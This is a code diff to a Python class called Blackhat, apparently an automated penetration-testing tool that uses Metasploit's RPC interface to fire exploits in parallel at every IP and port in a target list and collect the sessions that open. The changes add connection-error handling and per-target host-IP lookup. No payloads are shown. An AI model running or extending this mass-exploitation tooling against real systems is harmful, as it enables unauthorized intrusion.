@@ -8,6 +8,14 @@ import random
 
 class Blackhat:
     def __init__(self):
+
+        ######################IF LAUNCH THROUGH GRAPHIC INTERFACE, THEN RELOCATE OS POINTER###################
+        try:
+            os.chdir('dashboard/static/script/')
+            self.flag_relocate = True
+        except Exception:
+            pass
+
         self.json_monitor = Json_monitor()
         self.env = Msfrpc()
         self.targets_tree = self.json_monitor.get_targets_tree()
@@ -16,9 +24,12 @@ class Blackhat:
         self.env.color_monitor.print_intro_banner()
 
         ######################CONNECT YOURSELF TO MSGRPC#######################################################
+        self.flag_connection_error = None
         self.env.launch_metasploit()
-        self.env.connection_rpc()
-
+        try:
+            self.env.connection_rpc()
+        except Exception as e:
+            self.flag_connection_error = -1
         ######################STORE INFORMATIONS###############################################################
         self.tree_targets = None
         self.default_tree_payload_per_exploit = None
@@ -32,13 +43,6 @@ class Blackhat:
 
         ######################MULTIPROCESS INITIALIZER########################################################
         # self.lock = multiprocessing.Lock()
-
-        ######################IF LAUNCH THROUGH GRAPHIC INTERFACE, THEN RELOCATE OS POINTER###################
-        try:
-            os.chdir('dashboard/static/script/')
-            self.flag_relocate = True
-        except Exception:
-            pass
 
     ####################SUB FUNCTION TO HANDLE CORRECTION AND OPTIMIZATION####################################
     #                ________
@@ -404,13 +408,13 @@ class Blackhat:
         else:
             return False
 
-    def get_host_ip(self):
+    def get_host_ip(self, ip_target):
         '''
         Method used to get the ip of the host
         :return:
         '''
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
+        s.connect((ip_target, 80))
         self.host_ip = s.getsockname()[0]
         s.close()
 
@@ -624,6 +628,10 @@ class Blackhat:
         flag_ia_data_load = None
         pool = multiprocessing.Pool(processes=20)  # 20 simultaneous process
         ######################
+        ###CHECK CONNECTION###
+        if self.flag_connection_error == -1:
+            return None
+        ######################
         if mode == "train":
             # TODO
             '''
@@ -638,16 +646,6 @@ class Blackhat:
                 '''
                 a = None
                 flag_ia_data_load = 1
-
-            # -------------------------------------------------RETRIEVE HOST IP--------------------------------------- #
-            self.get_host_ip()
-            print(self.env.color_monitor.background_OKCYAN,
-                  "--------------------------------------------------------",
-                  "[*] Host ip is set : {}".format(str(self.host_ip)),
-                  "--------------------------------------------------------",
-                  self.env.color_monitor.background_ENDC)
-            # -------------------------------------------------END HOST IP-------------------------------------------- #
-
             # -------------------------------------------------BEGIN TREE--------------------------------------------- #
 
             ###RETRIEVE THE TARGET TREE IF ALREADY STORED###
@@ -718,6 +716,14 @@ class Blackhat:
 
             for ip in [*self.targets_tree]:
                 ###DISPLAY INFO###
+                # -------------------------------------------------RETRIEVE HOST IP--------------------------------------- #
+                self.get_host_ip(ip)
+                print(self.env.color_monitor.background_OKCYAN,
+                      "--------------------------------------------------------",
+                      "[*] Host ip is set : {}".format(str(self.host_ip)),
+                      "--------------------------------------------------------",
+                      self.env.color_monitor.background_ENDC)
+                # -------------------------------------------------END HOST IP-------------------------------------------- #
                 print(self.env.color_monitor.background_OKCYAN,
                       "--------------------------------------------------------",
                       "[*] Target ip is set : {}".format(str(ip)),
@@ -744,7 +750,6 @@ class Blackhat:
                                          args=(str(ip), str(port_number), exploit, flag_ia_data_load))
                 pool.close()
                 pool.join()
-
 
                 ######################IF LAUNCH THROUGH GRAPHIC INTERFACE, THEN RELOCATE OS POINTER###################
                 if self.flag_relocate:
@@ -898,20 +903,23 @@ class Blackhat:
                 #               self.env.color_monitor.background_ENDC)
 
         toc = time.time()
-        print("\n\ntime : ", toc-tic)
+        print("\n\ntime : ", toc - tic)
+        print(self.env.color_monitor.background_OKCYAN + "[*] Session :",
+              self.env.client.sessions.list,
+              self.env.color_monitor.background_ENDC)
         return self.env.client.sessions.list
 
 
 if __name__ == '__main__':
     foo = Blackhat()
-    # foo.get_targets_tree()
-    # foo.get_default_payload_per_exploit_tree()
-    # foo.get_targets_per_exploit_tree()
-    # foo.get_targets_option_for_target_per_exploit('172.16.1.2')
-    # foo.get_default_checkmodule_per_exploit_tree()
-    sessions_list = foo.launch_exploitation(mode='test')
-    print(
-        foo.env.color_monitor.background_OKGREEN + "-------------------------------------" + foo.env.color_monitor.background_ENDC)
-    print(foo.env.color_monitor.background_HEADER, sessions_list, foo.env.color_monitor.background_ENDC)
-    print(
-        foo.env.color_monitor.background_OKGREEN + "-------------------------------------" + foo.env.color_monitor.background_ENDC)
+    foo.get_targets_tree()
+    # # foo.get_default_payload_per_exploit_tree()
+    # # foo.get_targets_per_exploit_tree()
+    # # foo.get_targets_option_for_target_per_exploit('172.16.1.2')
+    # # foo.get_default_checkmodule_per_exploit_tree()
+    # sessions_list = foo.launch_exploitation(mode='test')
+    # print(
+    #     foo.env.color_monitor.background_OKGREEN + "-------------------------------------" + foo.env.color_monitor.background_ENDC)
+    # print(foo.env.color_monitor.background_HEADER, sessions_list, foo.env.color_monitor.background_ENDC)
+    # print(
+    #     foo.env.color_monitor.background_OKGREEN + "-------------------------------------" + foo.env.color_monitor.background_ENDC)
